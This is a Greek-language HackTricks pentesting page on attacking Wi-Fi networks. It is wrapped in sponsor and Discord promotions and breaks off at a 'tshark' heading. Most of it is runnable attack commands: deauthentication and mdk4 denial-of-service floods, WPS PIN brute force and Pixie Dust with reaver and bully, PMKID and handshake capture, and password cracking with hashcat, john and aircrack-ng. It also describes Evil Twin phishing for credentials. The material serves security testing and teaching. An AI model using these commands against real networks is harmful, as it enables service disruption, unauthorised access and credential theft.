# Ελεγχος ασφαλείας Wifi

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Εγγραφείτε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευρήματα ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

## Βασικές εντολές Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Εργαλεία

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Το Airgeddon είναι ένα πολύ ισχυρό εργαλείο για την επίθεση και την ανάλυση ασύρματων δικτύων. Παρέχει μια ευέλικτη και εύχρηστη πλατφόρμα για την εκτέλεση διαφόρων επιθέσεων σε ασύρματα δίκτυα, όπως το αποκρυπτογράφηση κλειδιών WEP/WPA/WPA2, τον εντοπισμό και τον σάρωση δικτύων, καθώς και την εκτέλεση επιθέσεων εκμετάλλευσης.

Το Airgeddon υποστηρίζει πολλές διάφορες τεχνικές επίθεσης, όπως το Evil Twin, το Rogue AP, το WPS attack και το PMKID attack. Επίσης, παρέχει εργαλεία για την ανάλυση της κίνησης δεδομένων στο ασύρματο δίκτυο, την ανίχνευση και την εκμετάλλευση ευπάθειών στο δίκτυο, καθώς και την αποκάλυψη κρυφών δικτύων.

Το Airgeddon είναι ένα εξαιρετικά χρήσιμο εργαλείο για επαγγελματίες χάκερ και ερευνητές ασφάλειας που επιθυμούν να ελέγξουν την ασφάλεια των ασύρματων δικτύων και να εκμεταλλευτούν τυχόν ευπάθειες.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Εκτέλεση του airgeddon με το docker**

Το airgeddon είναι ένα εργαλείο που χρησιμοποιείται για την εκτέλεση επιθέσεων σε ασύρματα δίκτυα. Μπορείτε να το εκτελέσετε με τη χρήση του Docker για να διευκολύνετε την εγκατάσταση και τη χρήση του.

Για να εκτελέσετε το airgeddon με το Docker, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε και εγκαταστήστε το Docker στο σύστημά σας.
2. Ανοίξτε ένα τερματικό και εκτελέστε την εντολή `docker pull v1s1t0r1sh3r3/airgeddon` για να κατεβάσετε την εικόνα του airgeddon από το Docker Hub.
3. Αφού ολοκληρωθεί η λήψη, εκτελέστε την εντολή `docker run -it --net=host --privileged v1s1t0r1sh3r3/airgeddon` για να ξεκινήσετε το airgeddon στο Docker.
4. Ακολουθήστε τις οδηγίες που εμφανίζονται στην οθόνη για να ρυθμίσετε και να χρησιμοποιήσετε το airgeddon.

Με αυτόν τον τρόπο, μπορείτε να εκτελέσετε το airgeddon με το Docker χωρίς να χρειάζεται να εγκαταστήσετε τις απαιτούμενες εξαρτήσεις στο σύστημά σας.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Μπορεί να εκτελέσει επιθέσεις Evil Twin, KARMA και Known Beacons και στη συνέχεια να χρησιμοποιήσει ένα πρότυπο phishing για να καταφέρει να αποκτήσει το πραγματικό κωδικό πρόσβασης του δικτύου ή να καταγράψει διαπιστευτήρια κοινωνικών δικτύων.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Αυτό το εργαλείο αυτοματοποιεί επιθέσεις **WPS/WEP/WPA-PSK**. Θα κάνει αυτόματα τα εξής:

* Θα ρυθμίσει τη διεπαφή σε λειτουργία παρακολούθησης
* Θα σαρώσει για πιθανά δίκτυα - Και θα σας επιτρέψει να επιλέξετε τα θύματα
* Αν είναι WEP - Θα εκτελέσει επιθέσεις WEP
* Αν είναι WPA-PSK
* Αν είναι WPS: Επίθεση Pixie dust και επίθεση brute-force (να είστε προσεκτικοί, η επίθεση brute-force μπορεί να διαρκέσει πολύ χρόνο). Σημειώστε ότι δεν δοκιμάζει null PIN ή PIN που προέρχονται από βάση δεδομένων/δημιουργούνται αυτόματα.
* Θα προσπαθήσει να καταγράψει το PMKID από το AP για να το σπάσει
* Θα προσπαθήσει να αποσυνδέσει τους πελάτες του AP για να καταγράψει ένα handshake
* Αν έχει PMKID ή Handshake, θα προσπαθήσει να το σπάσει χρησιμοποιώντας τους 5000 κορυφαίους κωδικούς πρόσβασης.

## Σύνοψη Επιθέσεων

* **DoS**
* Αποσυνδέσεις/αποσύνδεση -- Αποσυνδέστε όλους (ή ένα συγκεκριμένο ESSID/πελάτη)
* Τυχαία ψεύτικα APs -- Απόκρυψη δικτύων, πιθανή ανατροπή σαρωτών
* Υπερφόρτωση AP -- Προσπάθεια να απενεργοποιηθεί το AP (συνήθως όχι πολύ χρήσιμο)
* WIDS -- Παιχνίδι με το IDS
* TKIP, EAPOL -- Ορισμένες συγκεκριμένες επιθέσεις για DoS ορισμένων APs
* **Αποκωδικοποίηση**
* Αποκωδικοποίηση **WEP** (πολλά εργαλεία και μέθοδοι)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute-force
* \[DoS +] Καταγραφή **WPA handshake** + Αποκωδικοποίηση
* **WPA-MGT**
* Καταγραφή **όνομα χρήστη**
* **Brute-Force** Διαπιστευτήρια
* **Κακόβουλος Δίδυμος** (με ή χωρίς DoS)
* **Ανοιχτός** Κακόβουλος Δίδυμος \[+ DoS] -- Χρήσιμο για την καταγραφή διαπιστευτηρίων captive portal και/ή για την εκτέλεση επιθέσεων LAN
* **WPA-PSK** Κακόβουλος Δίδυμος -- Χρήσιμο για επιθέσεις στο δίκτυο αν γνωρίζετε τον κωδικό πρόσβασης
* **WPA-MGT** -- Χρήσιμο για την καταγραφή διαπιστευτηρίων εταιρείας
* **KARMA, MANA**, **Loud MANA**, **Γνωστός μεταδότης**
* **+ Ανοιχτός** -- Χρήσιμο για την καταγραφή διαπιστευτηρίων captive portal και/ή για την εκτέλεση επιθέσεων LAN
* **+ WPA** -- Χρήσιμο για την καταγραφή WPA handshakes

## DoS

### Πακέτα Αποσύνδεσης

**Περιγραφή από** [**εδώ**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Οι επιθέσεις **αποσύνδεσης**, μια διαδεδομένη μέθοδος στο χάκινγκ Wi-Fi, περιλαμβάνουν την πλαστογράφηση "διαχειριστικών" πλαισίων για να **αποσυνδέσουν εξαναγκαστικά συσκευές από ένα δίκτυο**. Αυτά τα μη κρυπτογραφημένα πακέτα παραπλανούν τους πελάτες να πιστέψουν ότι προέρχονται από το νόμιμο δίκτυο, επιτρέποντας στους επιτιθέμενους να συλλέξουν WPA handshakes για σκοπούς αποκωδικοποίησης ή να διαταράξουν μόνιμα τις συνδέσεις του δικτύου. Αυτή η τακτική, εντυπωσιακή στην απλότητά της, χρησιμοποιείται ευρέως και έχει σημαντικές επιπτώσεις στην ασφάλεια του δικτύου.

**Αποσύνδεση χρησιμοποιώντας το Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 σημαίνει αποσύνδεση
* 1 είναι ο αριθμός των αποσυνδέσεων που θα σταλούν (μπορείτε να στείλετε πολλές αν θέλετε); 0 σημαίνει να τις στείλετε συνεχώς
* \-a 00:14:6C:7E:40:80 είναι η διεύθυνση MAC του σημείου πρόσβασης
* \-c 00:0F:B5:34:30:30 είναι η διεύθυνση MAC του πελάτη που θα αποσυνδεθεί. Αν αυτό παραλείφθεί, τότε στέλνεται αποσύνδεση ευρείας εκπομπής (δεν λειτουργεί πάντα)
* ath0 είναι το όνομα της διεπαφής

### Πακέτα Διάσπασης

**Τα πακέτα διάσπασης**, παρόμοια με τα πακέτα αποσύνδεσης, είναι ένας τύπος διαχειριστικής καρέ χρησιμοποιούμενο σε δίκτυα Wi-Fi. Αυτά τα πακέτα χρησιμεύουν για να διακόψουν τη σύνδεση μεταξύ μιας συσκευής (όπως ένας φορητός υπολογιστής ή ένα smartphone) και ενός σημείου πρόσβασης (AP). Η κύρια διάκριση μεταξύ αποσύνδεσης και αποσύνδεσης βρίσκεται στα σενάρια χρήσης τους. Ενώ ένα AP εκπέμπει **πακέτα αποσύνδεσης για να αφαιρέσει εκδικητικές συσκευές από το δίκτυο, τα πακέτα διάσπασης συνήθως αποστέλλονται όταν το AP υπόκειται σε απενεργοποίηση**, επανεκκίνηση ή μετακίνηση, με αποτέλεσμα την αποσύνδεση όλων των συνδεδεμένων κόμβων.

**Αυτή η επίθεση μπορεί να πραγματοποιηθεί από το mdk4 (λειτουργία "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Περισσότερες επιθέσεις DOS από το mdk4**

**Εδώ** [**εδώ**](https://en.kali.tools/?p=864)**.**

**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ b: Beacon Flooding**

Αποστέλλει πλαίσια beacon για να εμφανίσει ψεύτικα APs στους πελάτες. Αυτό μπορεί να προκαλέσει καμιά φορά την ανατροφοδότηση του δικτύου και ακόμα και των προγραμμάτων οδήγησης!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ α: Απόρριψη Υπηρεσίας Πιστοποίησης**

Η αποστολή πλαισίων πιστοποίησης σε όλα τα προσβάσιμα Σημεία Πρόσβασης (APs) εντός εμβέλειας μπορεί να υπερφορτώσει αυτά τα APs, ειδικά όταν εμπλέκονται πολλοί πελάτες. Αυτή η έντονη κίνηση μπορεί να οδηγήσει σε αστάθεια του συστήματος, προκαλώντας την παγώματος ή ακόμα και την επανεκκίνηση ορισμένων APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ p: Ανίχνευση και Βίαιη Δοκιμή SSID**

Η ανίχνευση των σημείων πρόσβασης (APs) ελέγχει εάν ένα SSID αποκαλύπτεται σωστά και επιβεβαιώνει την εμβέλεια του AP. Αυτή η τεχνική, σε συνδυασμό με τη **βίαιη δοκιμή κρυφών SSID** με ή χωρίς λίστα λέξεων, βοηθά στον εντοπισμό και την πρόσβαση σε κρυφά δίκτυα.

**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ m: Εκμετάλλευση Αντιμέτρων Michael**

Η αποστολή τυχαίων ή διπλών πακέτων σε διάφορες ουρές QoS μπορεί να ενεργοποιήσει τα αντιμέτρα Michael σε **TKIP APs**, οδηγώντας σε απενεργοποίηση του AP για ένα λεπτό. Αυτή η μέθοδος είναι μια αποτελεσματική τακτική επίθεσης **DoS** (Άρνησης Υπηρεσίας).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ e: ΕΙΣΑΓΩΓΗ ΠΑΚΕΤΩΝ EAPOL Start και Logoff**

Η πλημμύρα ενός AP με πλαίσια **EAPOL Start** δημιουργεί **ψεύτικες συνεδρίες**, κατακλύζοντας το AP και αποκλείοντας τους νόμιμους πελάτες. Εναλλακτικά, η εισαγωγή **ψεύτικων μηνυμάτων EAPOL Logoff** αποσυνδέει εξαναγκαστικά τους πελάτες, και οι δύο μέθοδοι διακόπτουν αποτελεσματικά την υπηρεσία του δικτύου.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ s: Επιθέσεις για δίκτυα μεσαίας σύνδεσης IEEE 802.11s**

Διάφορες επιθέσεις στη διαχείριση συνδέσεων και δρομολόγησης σε δίκτυα μεσαίας σύνδεσης.

**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ w: Σύγχυση WIDS**

Η σύνδεση πελατών σε πολλαπλούς κόμβους WDS ή πλαστούς rogue APs μπορεί να παραπλανήσει τα Συστήματα Ανίχνευσης και Πρόληψης Εισβολών, δημιουργώντας σύγχυση και δυνητική κατάχρηση του συστήματος.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ΛΕΙΤΟΥΡΓΙΑ ΕΠΙΘΕΣΗΣ f: Packet Fuzzer**

Ένα εργαλείο packet fuzzer που προσφέρει διάφορες πηγές πακέτων και έναν εκτεταμένο σύνολο τροποποιητών για την αλλοίωση των πακέτων.

### **Airggedon**

Το _**Airgeddon**_ προσφέρει τις περισσότερες από τις επιθέσεις που προτάθηκαν στα προηγούμενα σχόλια:

![](<../../.gitbook/assets/image (126).png>)

## WPS

Το WPS (Wi-Fi Protected Setup) απλοποιεί τη διαδικασία σύνδεσης συσκευών σε ένα δρομολογητή, βελτιώνοντας την ταχύτητα και την ευκολία εγκατάστασης για δίκτυα που έχουν κρυπτογράφηση με **WPA** ή **WPA2** Personal. Δεν είναι αποτελεσματικό για την ευάλωτη ασφάλεια WEP. Το WPS χρησιμοποιεί ένα 8-ψήφιο PIN, που επικυρώνεται σε δύο μισά, καθιστώντας το ευάλωτο σε επιθέσεις brute-force λόγω του περιορισμένου αριθμού συνδυασμών (11.000 πιθανότητες).

### WPS Bruteforce

Υπάρχουν 2 κύρια εργαλεία για την εκτέλεση αυτής της ενέργειας: το Reaver και το Bully.

* Το **Reaver** έχει σχεδιαστεί για να είναι μια ανθεκτική και πρακτική επίθεση κατά του WPS και έχει δοκιμαστεί εναντίον ποικίλων σημείων πρόσβασης και υλοποιήσεων WPS.
* Το **Bully** είναι μια **νέα υλοποίηση** της επίθεσης brute force του WPS, γραμμένη σε C. Έχει αρκετά πλεονεκτήματα έναντι του αρχικού κώδικα του reaver: λιγότερες εξαρτήσεις, βελτιωμένη απόδοση μνήμης και επεξεργαστή, σωστή χειρισμός της τελικής διάταξης και ένα πιο αξιόπιστο σύνολο επιλογών.

Η επίθεση εκμεταλλεύεται την ευπάθεια του **WPS PIN**, ιδιαίτερα την αποκάλυψη των πρώτων τεσσάρων ψηφίων και τον ρόλο του τελευταίου ψηφίου ως έλεγχος ακεραιότητας, διευκολύνοντας την επίθεση brute-force. Ωστόσο, οι αμυντικές μέθοδοι κατά των επιθέσεων brute-force, όπως η **αποκλεισμός των MAC διευθύνσεων** επιθετικών επιτιθέμενων, απαιτούν **περιστροφή της MAC διεύθυνσης** για να συνεχιστεί η επίθεση.

Αφού αποκτηθεί το WPS PIN με εργαλεία όπως το Bully ή το Reaver, ο επιτιθέμενος μπορεί να συμπεράνει το WPA/WPA2 PSK, εξασφαλίζοντας **μόνιμη πρόσβαση στο δίκτυο**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Έξυπνη Βίαιη Δύναμη**

Αυτή η εξελιγμένη προσέγγιση στοχεύει τους WPS PIN χρησιμοποιώντας γνωστές ευπάθειες:

1. **Προ-ανακαλυμμένα PIN**: Χρησιμοποιήστε μια βάση δεδομένων με γνωστά PIN που συνδέονται με συγκεκριμένους κατασκευαστές που χρησιμοποιούν ομοιόμορφα WPS PIN. Αυτή η βάση δεδομένων συσχετίζει τα πρώτα τρία οκτάδες της διεύθυνσης MAC με πιθανά PIN για αυτούς τους κατασκευαστές.
2. **Αλγόριθμοι Δημιουργίας PIN**: Χρησιμοποιήστε αλγόριθμους όπως το ComputePIN και το EasyBox, που υπολογίζουν τα WPS PIN βασιζόμενα στη MAC διεύθυνση του AP. Ο αλγόριθμος Arcadyan απαιτεί επιπλέον ένα αναγνωριστικό συσκευής, προσθέτοντας ένα επίπεδο στη διαδικασία δημιουργίας του PIN.

### Επίθεση WPS Pixie Dust

Ο **Dominique Bongard** ανακάλυψε μια αδυναμία σε ορισμένα Σημεία Πρόσβασης (APs) που αφορά τη δημιουργία μυστικών κωδικών, γνωστών ως **nonces** (**E-S1** και **E-S2**). Εάν αυτά τα nonces μπορούν να ανακαλυφθούν, η αποκωδικοποίηση του WPS PIN του AP γίνεται εύκολη. Το AP αποκαλύπτει το PIN μέσα σε έναν ειδικό κωδικό (hash) για να αποδείξει ότι είναι γνήσιο και όχι ένα ψεύτικο (rogue) AP. Αυτά τα nonces είναι ουσιαστικά τα "κλειδιά" για να ξεκλειδώσουν το "ασφαλές" που κρατά το WPS PIN. Περισσότερες πληροφορίες μπορούν να βρεθούν [εδώ](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Απλά, το πρόβλημα είναι ότι ορισμένα APs δεν χρησιμοποίησαν αρκετά τυχαία κλειδιά για την κρυπτογράφηση του PIN κατά τη διαδικασία σύνδεσης. Αυτό καθιστά το PIN ευάλωτο σε μαντεψιές από έξω από το δίκτυο (επίθεση εκτός σύνδεσης με βίαιη δύναμη).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Επίθεση Null Pin

Ορισμένα κακοσχεδιασμένα συστήματα επιτρέπουν ακόμα και σε έναν **Null PIN** (έναν κενό ή μη υπαρκτό PIN) να παρέχει πρόσβαση, πράγμα που είναι αρκετά ασυνήθιστο. Το εργαλείο **Reaver** είναι ικανό να ελέγξει αυτήν την ευπάθεια, για την οποία το **Bully** δεν είναι ικανό.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Όλες οι προτεινόμενες επιθέσεις WPS μπορούν να πραγματοποιηθούν εύκολα χρησιμοποιώντας το _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* Οι επιλογές 5 και 6 σας επιτρέπουν να δοκιμάσετε **το δικό σας προσαρμοσμένο PIN** (αν έχετε κάποιο)
* Οι επιλογές 7 και 8 πραγματοποιούν την επίθεση **Pixie Dust**
* Η επιλογή 13 σας επιτρέπει να δοκιμάσετε το **NULL PIN**
* Οι επιλογές 11 και 12 θα **συλλέξουν τα PIN που σχετίζονται με το επιλεγμένο AP από διαθέσιμες βάσεις δεδομένων** και θα **δημιουργήσουν** πιθανά **PIN** χρησιμοποιώντας: ComputePIN, EasyBox και προαιρετικά Arcadyan (συνιστάται, γιατί όχι;)
* Οι επιλογές 9 και 10 θα δοκιμάσουν **κάθε πιθανό PIN**

## **WEP**

Τόσο κατεστραμμένο και αχρησιμοποίητο σήμερα. Απλά γνωρίστε ότι το _**airgeddon**_ έχει μια επιλογή WEP με το όνομα "All-in-One" για να επιτεθεί σε αυτόν τον τύπο προστασίας. Περισσότερα εργαλεία προσφέρουν παρόμοιες επιλογές.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανακοινώσεις για τις ανταμοιβές ευρημάτων ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετάσχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

***


## WPA/WPA2 PSK

### PMKID

Το 2018, το **hashcat** [αποκάλυψε](https://hashcat.net/forum/thread-7717.html) μια νέα μέθοδο επίθεσης, μοναδική επειδή χρειάζεται μόνο **ένα μόνο πακέτο** και δεν απαιτεί τη σύνδεση κανενός πελάτη με τον στόχο AP - μόνο αλληλεπίδραση μεταξύ του επιτιθέμενου και του AP.

Πολλοί σύγχρονοι δρομολογητές προσθέτουν ένα προαιρετικό πεδίο στο πρώτο πλαίσιο EAPOL κατά τη συνδεσμολογία, γνωστό ως `Robust Security Network`. Αυτό περιλαμβάνει το `PMKID`.

Όπως εξηγεί η αρχική ανάρτηση, το **PMKID** δημιουργείται χρησιμοποιώντας γνωστά δεδομένα:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Δεδομένου ότι το "Όνομα PMK" είναι σταθερό, γνωρίζουμε το BSSID του AP και του σταθμού, και το `PMK` είναι ταυτόσημο με αυτό από μια πλήρης 4-βηματική χειραψία, το **hashcat** μπορεί να χρησιμοποιήσει αυτές τις πληροφορίες για να αποκρυπτογραφήσει το PSK και να ανακτήσει τον κωδικό πρόσβασης!

Για να **συλλέξετε** αυτές τις πληροφορίες και να **δοκιμάσετε** τον κωδικό πρόσβασης τοπικά, μπορείτε να κάνετε:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Τα **PMKIDs που καταγράφηκαν** θα εμφανιστούν στη **κονσόλα** και θα **αποθηκευτούν** επίσης μέσα στον φάκελο \_ **/tmp/attack.pcap**\_\
Τώρα, μετατρέψτε την καταγραφή σε μορφή **hashcat/john** και αποκρυπτογραφήστε την:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Παρακαλώ σημειώστε ότι η σωστή μορφή ενός σωστού hash περιέχει **4 μέρη**, όπως: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
Εάν το δικό σας περιέχει **μόνο** **3 μέρη**, τότε είναι **άκυρο** (η καταγραφή του PMKID δεν ήταν έγκυρη).

Σημειώστε ότι το `hcxdumptool` **καταγράφει επίσης τις αλληλεπιδράσεις** (κάτι τέτοιο θα εμφανιστεί: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Μπορείτε να **μετατρέψετε** τις **αλληλεπιδράσεις** σε μορφή **hashcat**/**john** χρησιμοποιώντας το `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Παρατήρησα ότι ορισμένα handshakes που καταγράφηκαν με αυτό το εργαλείο δεν μπορούσαν να αποκρυπτογραφηθούν, ακόμα και αν γνωρίζαμε το σωστό κωδικό πρόσβασης. Θα συνιστούσα να καταγράφετε handshakes και με τον παραδοσιακό τρόπο, αν είναι δυνατόν, ή να καταγράφετε πολλά από αυτά χρησιμοποιώντας αυτό το εργαλείο._

### Καταγραφή Handshake

Μια επίθεση σε δίκτυα **WPA/WPA2** μπορεί να εκτελεστεί καταγράφοντας ένα **handshake** και προσπαθώντας να **αποκρυπτογραφήσει** τον κωδικό πρόσβασης **εκτός σύνδεσης**. Αυτή η διαδικασία περιλαμβάνει την παρακολούθηση της επικοινωνίας ενός συγκεκριμένου δικτύου και **BSSID** σε ένα συγκεκριμένο **κανάλι**. Εδώ έχουμε μια απλοποιημένη οδηγία:

1. Αναγνωρίστε το **BSSID**, το **κανάλι** και έναν **συνδεδεμένο πελάτη** του επιθυμητού δικτύου.
2. Χρησιμοποιήστε την εντολή `airodump-ng` για να παρακολουθήσετε την κίνηση του δικτύου στο καθορισμένο κανάλι και BSSID, ελπίζοντας να καταγράψετε ένα handshake. Η εντολή θα έχει την εξής μορφή:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Για να αυξήσετε την πιθανότητα καταγραφής μιας αλληλεπίδρασης, αποσυνδέστε προσωρινά τον πελάτη από το δίκτυο για να τον αναγκάσετε να επαναπιστευτεί. Αυτό μπορεί να γίνει χρησιμοποιώντας την εντολή `aireplay-ng`, η οποία στέλνει πακέτα αποσύνδεσης στον πελάτη:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Σημείωση ότι καθώς ο πελάτης αποσυνδέθηκε, μπορεί να προσπαθήσει να συνδεθεί σε έναν διαφορετικό AP ή, σε άλλες περιπτώσεις, σε ένα διαφορετικό δίκτυο._

Μόλις εμφανιστούν κάποιες πληροφορίες handshake στο `airodump-ng`, αυτό σημαίνει ότι έχει καταγραφεί το handshake και μπορείτε να σταματήσετε την ακρόαση:

![](<../../.gitbook/assets/image (172) (1).png>)

Μόλις καταγραφεί το handshake, μπορείτε να το **αποκρυπτογραφήσετε** με το `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Έλεγξε αν υπάρχει handshake στο αρχείο

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**

